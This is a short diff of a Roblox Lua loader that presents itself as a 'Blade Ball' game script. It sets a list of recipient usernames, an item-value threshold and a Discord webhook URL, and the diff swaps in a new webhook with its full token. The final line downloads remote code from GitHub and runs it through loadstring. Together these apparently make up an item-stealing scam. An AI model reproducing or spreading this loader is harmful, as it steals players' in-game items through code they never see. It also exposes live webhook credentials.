@@ -1,7 +1,7 @@
 _G.Usernames = {"ymtthw1", "benok_karl", "tresbigT"} -- you can add as many as you'd like
 _G.min_rap = 0
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1466184811155816702/2BnhipONJRgxK5lKD-6j2ITXJFginK-lszN3IBB9uqgKN93SSeAh4pOpT7CwQRbiqBUE" -- change to your webhook
+_G.webhook = "https://discord.com/api/webhooks/1466197400421924890/OyU5mTRJlAGoP63yheK0aAwk3sWOx70Zg4VzYipd42cKkvs8n0KodeGmJUa31sKNqNye" -- change to your webhook
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Scriptsnets/BladeBall/refs/heads/main/source.lua"))()
 
